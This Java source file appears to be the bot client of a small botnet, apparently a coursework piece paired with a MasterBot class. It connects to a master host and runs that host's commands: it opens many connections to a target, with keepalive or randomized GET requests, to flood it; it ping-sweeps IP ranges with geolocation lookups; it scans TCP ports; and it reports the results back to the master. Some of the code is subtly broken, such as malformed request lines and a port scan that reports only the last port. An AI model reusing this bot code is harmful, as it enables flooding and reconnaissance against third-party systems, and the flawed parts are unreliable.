import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.UnknownHostException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Iterator;
import java.io.PrintWriter;
import java.util.Random;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.URL;

public class SlaveBot {
    static MasterBot m = new MasterBot();
    ArrayList < String > ipList = new ArrayList < > ();
    ArrayList < String > geoloclist = new ArrayList < > ();
    ArrayList < String > portList = new ArrayList < > ();
    String ip;
    int port;
    String target;

    ArrayList < Socket > targethosts = null;
    void Print() {
        System.out.println(ipList);
    }

    SlaveBot() {
        targethosts = new ArrayList < Socket > ();
    }
    void print() {
        System.out.println(ipList);
    }

    static String x = "";
    static String y = "";
    static String z = "";
    static Socket s = null;


    public static void main(String[] args) {
        SlaveBot slave = new SlaveBot();
        /** connect to the master */
        //System.out.println(""+args[0]+" "+args[1] + " " +" " + args[2]);
        slave.ip = new String(args[1]);
        slave.port = Integer.parseInt(args[3]);


        try {
            //System.out.println("ip="+slave.ip+"port="+slave.port);
            s = new Socket(slave.ip, slave.port);
        } catch (UnknownHostException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        //now connection is established; wait for commands
        try {
            do {

                BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
                String cmd = br.readLine();

                //System.out.println("cmd is " + cmd);
                //process cmd
                if (cmd.startsWith("disconnect")) {
                    String[] splitResult = cmd.split("\\s+");
                    if (splitResult.length >= 4) {
                        int port;
                        if (splitResult[3].equals("all"))
                            port = 0;
                        else
                            port = Integer.parseInt(splitResult[3]);
                        slave.disconnect(splitResult[2], port);
                    } else {
                        System.out.println("Invalid command");
                    }
                } else if (cmd.startsWith("connect")) {

                    String[] splitResult = cmd.split("\\s+");
                    int tp = Integer.parseInt(splitResult[3]);
                    int connections = 1;
                    int parameters = splitResult.length;
                    String str = "";

                    if (splitResult[4].startsWith("keepalive") || splitResult[4].startsWith("url=/#q=")) {
                        connections = 1;
                    } else {
                        connections = Integer.parseInt(splitResult[4]) > 0 ? Integer.parseInt(splitResult[4]) : 1;
                    }


                    /** just connect to the target host */
                    Socket connToTarget = null;
                    for (int i = 0; i < connections; i++) {
                        try {

                            connToTarget = new Socket(InetAddress.getByName(splitResult[2]), Integer.parseInt(splitResult[3]));
                            slave.targethosts.add(connToTarget);
                            System.out.println("connected to " + connToTarget.getInetAddress().getHostName() + " " + connToTarget.getInetAddress().getHostAddress());
                            if (parameters == 6) {
                                str = splitResult[5];
                            } else if (parameters == 5) {
                                str = splitResult[4];

                            }
                            if (str.startsWith("keepalive")) {
                                connToTarget.setKeepAlive(true);
                                System.out.println("Socket is kept alive");
                            } else if (str.startsWith("url=/#q=")) {
                                String[] googlstr = str.split("/");
                                if (str.equals("url=/#q=")) {
                                    StringBuilder tmp = new StringBuilder();
                                    for (char ch = 'a'; ch <= 'z'; ++ch) {
                                        tmp.append(ch);
                                    }

                                    Random random = new Random();
                                    int size = random.nextInt(10);
                                    char[] buf = new char[size];
                                    char[] symbols = tmp.toString().toCharArray();
                                    for (int index = 0; index < size; ++index) {
                                        buf[index] = symbols[random.nextInt(symbols.length)];
                                    }
                                    String webstring = splitResult[2] + "/" + googlstr[1] + buf;
                                    PrintWriter pw = new PrintWriter(connToTarget.getOutputStream());
                                    pw.println("GET" + webstring + "HTTP/1.1\n");

                                    pw.flush();
                                } else {
                                    String webstring = splitResult[2] + "/" + googlstr[1];
                                    PrintWriter pw = new PrintWriter(connToTarget.getOutputStream());
                                    pw.println("GET" + webstring + "HTTP/1.1\n");
                                    //System.out.println("it is going inside url");
                                    pw.flush();
                                }

                            }

                        } catch (Exception e) {
                            System.out.println("exceptin " + e);
                        }
                        /** a connection is made to target host */
                    }
                } else if (cmd.startsWith("ipscan")||cmd.startsWith("geoipscan")) {
                    x = cmd;
                    SlaveBot x2 = new SlaveBot();
                    Runnable r1 = x2.new Runnable1();
                    Thread t1 = new Thread(r1);
                    t1.start();
                } else if (cmd.startsWith("tcpportscan")) {
                    System.out.println(cmd);
                    SlaveBot s2 = new SlaveBot();
                    y = cmd;
                    Runnable r2 = s2.new Runnable2();
                    Thread t2 = new Thread(r2);
                    t2.start();

                } 
                    //else if (cmd.startsWith("geoipscan")) {
//                    SlaveBot s3 = new SlaveBot();
//                    z = cmd;
//                    Runnable r3 = s3.new Runnable3();
//                    Thread t3 = new Thread(r3);
//                    t3.start();
//                } 
                    else {
                    System.out.println("Error; could not process command");
                }
            } while (true);

        } catch (Exception e) {
            System.out.println("ERR" + e);
        }


    }

    void disconnect(String sHostInfoOrIP, int port) {
        Iterator < Socket > it = targethosts.iterator();
        while (it.hasNext()) {
            Socket targethost = it.next();
            if ((targethost.getInetAddress().getHostAddress().compareTo(sHostInfoOrIP) == 0 || targethost.getInetAddress().getHostName().compareTo(sHostInfoOrIP) == 0)) {
                if (port == 0 || targethost.getPort() == port) {

                    try {
                        targethosts.remove(targethost);
                        System.out.println("WE now disconnect:" + targethost.getInetAddress().getHostName());
                        targethost.close();
                        it = targethosts.iterator();
                    } catch (Exception e) {
                        System.out.println("ERROR" + e);
                    }
                } else {
                    System.out.println("target not exist");
                }
            }
        }
    }

//    class Runnable3 implements Runnable {
//        public void run() {
//            System.out.println("command recived");
//            String[] string = z.split("\\s+");
//
//            String geolist = "";
//
//            //String str = string[2];
//
//            String[] ipStartRange = string[2].split("-");
//
//            //String ipAddressRange1 = ipStartRange[0];
//            //String ipAddressRange2 = ipStartRange[1];
//
//            String[] iptolongRange1 = ipStartRange[0].split("\\.");
//            String[] iptolongRange2 = ipStartRange[1].split("\\.");
//            long result1 = 0;
//            long result2 = 0;
//            for (int i = 0; i < iptolongRange1.length; i++) {
//                int power = 3 - i;
//                int ip = Integer.parseInt(iptolongRange1[i]);
//                result1 += ip * Math.pow(256, power);
//
//            }
//            //System.out.println(result1);
//            for (int i = 0; i < iptolongRange2.length; i++) {
//                int power = 3 - i;
//                int ip = Integer.parseInt(iptolongRange2[i]);
//                result2 += ip * Math.pow(256, power);
//
//            }
//            //System.out.println(result2);
//            PrintWriter write = null;
//			try {
//				write = new PrintWriter(s.getOutputStream());
//			} catch (IOException e1) {
//				// TODO Auto-generated catch block
//				e1.printStackTrace();
//			}
//
//            for (long ip = result1; ip <= result2; ip++) {
//
//                StringBuilder sb = new StringBuilder(15);
//                long x2 = ip;
//                String ipaddress;
//                for (int i = 0; i < 4; i++) {
//                    sb.insert(0, Long.toString(x2 & 0xff));
//
//                    if (i < 3) {
//                        sb.insert(0, '.');
//                    }
//                    x2 = x2 >> 8;
//
//                }
//                try {
//                    ipaddress = sb.toString();
//                    InetAddress inet = InetAddress.getByName(ipaddress);
//                    System.out.println("Sending Ping Request to " + ipaddress);
//                    StringBuilder result = new StringBuilder();
//
//                    if (inet.isReachable(200)) {
//
//                        //ipstr=ipstr+ipaddress+","+" ";
//                        //ipList.add(ipaddress);
//
//                        URL url = new URL("http://ip-api.com/csv/" +ipaddress );
//                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
//                        conn.setRequestMethod("GET");
//                        BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
//                        String line;
//                        while ((line = rd.readLine()) != null) {
//                            result.append(line);
//                        }
//                        String res= ipaddress+" "+ result.toString()+"\r\n" ;
//                        rd.close();
//                        //System.out.println(result.toString());
//                        //geolist = geolist+ ipaddress+" " + result.toString() ;
////                        
//                        geolist=geolist+res;
//                       // Writer out= new Bufferwritter(new OutputStreamWriter(geolist);
//
//                       
//                        //geoloclist.add(result.toString());
//                    }
//                   
//
//                } catch (Exception e) {
//                    System.out.println("Exception" + e);
//                }
//
//
//            }
//            write.println(geolist.toString());
//			write.flush();
//
//                 // System.out.println(geolist);
////            try {
////                PrintWriter write = new PrintWriter(s.getOutputStream());
////                write.println(geolist);
////                write.flush();
////            } catch (IOException e) {
////                // TODO Auto-generated catch block
////                e.printStackTrace();
////            }
//
//
//
//        }
//    }

    class Runnable2 implements Runnable {
        public void run() {
            System.out.println("command recieved");
            String[] string = y.split("\\s+");
            target = string[2];
            //String str = string[3];
            String[] tcpPortRange = string[3].split("-");
            Socket sock;
            String ports = null;
            String portnum = null;
            for (int p = Integer.parseInt(tcpPortRange[0]); p < Integer.parseInt(tcpPortRange[1]); p++)

            {
                try {
                    sock = new Socket();
                    sock.connect(new InetSocketAddress(target, p), 100);
                    ports = Integer.toString(p);
                    portnum = p + ",";
                    //portList.add(Integer.toString(p));
                    sock.close();
                } catch (Exception e) {

                }
            }

            try {
                PrintWriter write = new PrintWriter(s.getOutputStream());
                write.println(portnum);
                write.flush();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            //m.Printlist2(portList);
        }
    }

    class Runnable1 implements Runnable {



        @Override
        public void run() {
        	 String geolist = "";
                String ipstr = "";
                System.out.println(x);
                String[] string = x.split("\\s+");
                //System.out.println(string[2]);
                String str = string[2];

                String[] ipStartRange = str.split("-");

                String ipAddressRange1 = ipStartRange[0];
                String ipAddressRange2 = ipStartRange[1];

                String[] iptolongRange1 = ipAddressRange1.split("\\.");
                String[] iptolongRange2 = ipAddressRange2.split("\\.");
                long result1 = 0;
                long result2 = 0;
                for (int i = 0; i < iptolongRange1.length; i++) {
                    int power = 3 - i;
                    int ip = Integer.parseInt(iptolongRange1[i]);
                    result1 += ip * Math.pow(256, power);

                }
                //System.out.println(result1);
                for (int i = 0; i < iptolongRange2.length; i++) {
                    int power = 3 - i;
                    int ip = Integer.parseInt(iptolongRange2[i]);
                    result2 += ip * Math.pow(256, power);

                }
                //System.out.println(result2);


                for (long ip = result1; ip <= result2; ip++) {

                    StringBuilder sb = new StringBuilder(15);
                    long x2 = ip;
                    String ipaddress;
                    for (int i = 0; i < 4; i++) {
                        sb.insert(0, Long.toString(x2 & 0xff));

                        if (i < 3) {
                            sb.insert(0, '.');
                        }
                        x2 = x2 >> 8;

                    }
                    try {
                        ipaddress = sb.toString();
                        InetAddress inet = InetAddress.getByName(ipaddress);
                        System.out.println("Sending Ping Request to " + ipaddress);
                        StringBuilder result = new StringBuilder();

                        if (inet.isReachable(200)) {

                            ipstr = ipstr + ipaddress + "," + " ";
                            
                            URL url = new URL("http://ip-api.com/csv/" +ipaddress );
                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                            conn.setRequestMethod("GET");
                            BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                            String line;
                            while ((line = rd.readLine()) != null) {
                                result.append(line);
                            }
                            String res= ipaddress+" "+ result.toString()+"\r\n" ;
                            rd.close();
                            //System.out.println(result.toString());
                            //geolist = geolist+ ipaddress+" " + result.toString() ;
//                            
                            geolist=geolist+res;
                           // Writer out= new Bufferwritter(new OutputStreamWriter(geolist);

                           
                            //ipList.add(ipaddress);

                        }

                    } catch (Exception e) {
                        System.out.println("Exception" + e);
                    }


                }


                try {
                    PrintWriter write = new PrintWriter(s.getOutputStream());
                    //System.out.println(ipstr);
                    
                    if(x.startsWith("geoipscan")){
                    	write.println(geolist.toString());
             			write.flush();
                    }
                    else if (x.startsWith("ipscan")){
                    	 write.println(ipstr);
                         write.flush();
                    }
                } catch (IOException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }


                //m.Printlist(ipList);
            }
            // TODO Auto-generated method stub

    }
}